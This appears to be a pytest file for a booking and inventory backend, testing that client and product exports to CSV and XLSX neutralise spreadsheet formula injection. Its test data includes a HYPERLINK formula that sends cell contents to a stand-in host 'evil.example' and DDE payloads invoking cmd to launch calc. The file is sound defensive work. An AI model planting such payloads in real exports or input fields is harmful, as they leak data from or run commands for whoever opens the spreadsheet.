"""Exports can't smuggle spreadsheet formulas (security phase 4, audit L3 / CWE-1236).

A client named `=HYPERLINK("http://evil/?"&A1,"Click")` (the booking widget lets customers
type their own name) ran as a formula when the clients CSV or a report was opened in Excel;
openpyxl even saved such text as a real formula in XLSX exports.
"""
import csv
import io

import openpyxl
import pytest

from backend.core.spreadsheet import safe_cell, unguard_cell

EVIL = '=HYPERLINK("http://evil.example/?"&A1,"Click")'


@pytest.mark.parametrize("raw", [EVIL, "+cmd|' /C calc'!A0", "-2+3+cmd|' /C calc'!A0", "@SUM(1+1)", "\t=1+1"])
def test_formula_text_is_neutralised_and_round_trips(raw):
    out = safe_cell(raw)
    assert out.startswith("'") and unguard_cell(out) == raw


@pytest.mark.parametrize("raw", ["+91 98200 11223", "-12.50", "Plain name", "", 42, None, -3.5])
def test_ordinary_values_are_left_alone(raw):
    assert safe_cell(raw) == raw


@pytest.mark.asyncio
async def test_clients_csv_export_is_guarded(client, tenant):
    await client.post("/api/clients", json={"name": EVIL, "phone": "+91 98200 11223"}, headers=tenant)
    r = await client.get("/api/clients/export/csv", headers=tenant)
    assert r.status_code == 200, r.text
    rows = list(csv.DictReader(io.StringIO(r.text)))
    row = next(x for x in rows if "HYPERLINK" in x["name"])
    assert row["name"] == "'" + EVIL
    assert row["phone"] == "+91 98200 11223"


@pytest.mark.asyncio
async def test_products_xlsx_export_stores_text_not_a_formula_and_reimports(client, tenant):
    r = await client.post("/api/inventory/parts", json={"name": EVIL, "uom": "pcs"}, headers=tenant)
    assert r.status_code in (200, 201), r.text
    r = await client.get("/api/catalog/products/export", headers=tenant)
    assert r.status_code == 200, r.text
    ws = openpyxl.load_workbook(io.BytesIO(r.content)).active
    names = [c.value for c in ws["D"][1:]]
    cell = next(c for c in ws["D"][1:] if c.value and "HYPERLINK" in str(c.value))
    assert cell.data_type == "s" and cell.value == "'" + EVIL, names

    # re-importing the exported file matches the existing product, not a new "'=..." one
    r = await client.post("/api/catalog/products/import", headers=tenant,
                          files={"file": ("products.xlsx", r.content,
                                          "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")})
    assert r.status_code == 200, r.text
    body = r.json()
    assert body.get("created", 0) == 0, body
